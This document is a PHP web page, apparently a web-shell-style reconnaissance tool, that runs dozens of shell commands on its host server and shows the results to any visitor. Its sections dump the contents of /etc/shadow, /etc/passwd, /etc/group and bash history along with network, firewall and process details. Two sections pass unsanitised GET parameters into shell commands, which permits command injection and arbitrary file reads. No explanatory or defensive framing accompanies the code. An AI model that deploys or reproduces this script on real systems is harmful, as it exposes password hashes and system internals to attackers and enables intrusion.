<html>
<body>
<p align="left"><b><u><i><H1>SYSTEM INFORMATION</H1></i></u></b>
<br>
<hr>
<p align="left"><b><u>TAIL:</u></b>
<?php system("tail /var/www/html/cat.php");?>
<br>
<hr>
<p align="left"><b><u>Top 5 Processes:</u></b>
<?php echo "<pre>"; system("top -n 5 -d",$retvar); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Hostname:</u></b>
<?php echo "<pre>"; system("hostname -f");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>LocateNmap:</u></b>
<?php echo "<pre>";system("which nmap"); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>GCCVer:</u></b>
<?php echo "<pre>"; system("gcc -v"); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>ListStorage:</u></b>
<?php echo "<pre>"; $stor=system("df -h");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>RubyVer:</u></b>
<?php echo "<pre>"; system("ruby -v");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>PerlVer:</u></b>
<?php echo "<pre>"; system("perl -v"); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>PythonVer:</u></b>
<?php echo "<pre>"; system("python --version"); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Top 5 Processes:</u></b>
<?php echo "<pre>"; system("top -n 5 -d"); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>MySQLVer:</u></b>
<?php echo "<pre>"; system("mysql --version"); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Whoami:</u></b>
<?php echo "<pre>"; system('whoami'); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>UserHistory:</u></b>
<?php echo "<pre>"; system('cat ~/.bash_history'); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Ifconfig:</u></b>
<?php echo "<pre>"; system('ifconfig'); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Memory_Info_DMI:</u></b>
<?php echo "<pre>"; system('dmidecode'); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>CPU_Info:</u></b>
<?php echo "<pre>"; system('lscpu'); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Filename Contents:</u></b>
<?php echo "<pre>"; $fname=$_GET["$filename"]; system('cat $fname'); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Directory Listing:</u></b>
<?php $dirlist=$_GET["directory"]; $dl=shell_exec("ls -asl $dirlist"); echo "<pre>$dl</pre>";?>
<br>
<hr>
<p align="left"><b><u>PCI Information:</u></b>
<?php echo "<pre>"; system("lspci");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Exec System Cmd:</u></b>
<?php echo "<pre>"; system("echo 'MyNewTest'");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Issue:</u></b>
<?php echo "<pre>";system('cat /etc/issue');echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Release:</u></b>
<?php echo "<pre>"; system("cat /etc/*-release");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Release2:</u></b>
<?php echo "<pre>"; system("cat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Proc Version:</u></b>
<?php echo "<pre>"; system("cat /proc/version");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>RPM Installs:</u></b>
<?php echo "<pre>"; system("rpm -q kernel");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>DPKG Installs:</u></b>
<?php echo "<pre>"; system("dpkg -l");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>DMSG Output:</u></b>
<?php echo "<pre>"; system("dmesg | grep Linux");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>List Boot Directories:</u></b>
<?php echo "<pre>"; system("ls /boot | grep vmlinuz-");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>LSB Release:</u></b>
<?php echo "<pre>"; system("lsb_release -a");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Last Log:</u></b>
<?php echo "<pre>"; system("last -a");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Uname Information:</u></b>
<?php echo "<pre>"; system("uname -a");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Uname Information2:</u></b>
<?php echo "<pre>"; system("uname -mrs");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>UserID:</u></b>
<?php echo "<pre>"; system("id");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>History:</u></b>
<?php echo "<pre>"; system("history");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Arp List:</u></b>
<?php echo "<pre>"; system("arp -a"); echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>netstatinfo:</u></b>
<?php echo "<pre>"; system("netstat -anot");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>ps-list:</u></b>
<?php echo "<pre>"; system("ps -elf");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>ps-list-root:</u></b>
<?php echo "<pre>"; system("ps -elf | grep root");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>List Web Directory:</u></b>
<?php echo "<pre>"; system("ls -la /var/www/html/");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Apache2 Server Status:</u></b>
<?php echo "<pre>"; system("service apache2 status");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>CatResolve:</u></b>
<?php echo "<pre>"; system("cat /etc/resolv.conf");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>CatNetworks:</u></b>
<?php echo "<pre>"; system("cat /etc/networks");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Iptables List: (if the current user: <?php echo exec('whoami'); ?> has permissions)</u></b>
<?php echo "<pre>"; system("iptables -L") ;echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>IPtablesNAT: (if you have permissions)</u></b>
<?php echo "<pre>"; system("iptables -L -t nat");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>List Running Services:</u></b>
<?php $lsofi=shell_exec("lsof -i");echo "<code>$lsofi</code>";?>
<br>
<hr>
<p align="left"><b><u>Show all Services:</u></b>
<?php echo "<pre>"; system("cat /etc/services");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>List Web Server:</u></b>
<?php echo "<pre>"; system("grep 80 /etc/services");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Who CMD:</u></b>
<?php echo "<pre>"; system("w");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Show Route(s):></u></b>
<?php echo "<pre>"; system("route -n");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Breakout Users:</u></b>
<?php echo "<pre>"; system("cat /etc/passwd | awk -F : '{if ($3 > 999 && $3 < 60001) print $1,$3,$6}'");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>Show MOTD:</u></b>
<?php echo "<pre>"; system("cat /etc/motd");echo "</pre>";?>
<br>
<hr>
<p align="left"><b><u>CatGroup:</u></b>
<?php $egr=shell_exec("cat /etc/group");echo "<div>$egr</div>";?>
<br>
<hr>
<p align="left"><b><u>CatShadow:</u></b>
<?php $esh=shell_exec("cat /etc/shadow");echo "<code>$esh</code>";?>
<br>
<hr>
</body>
</html>
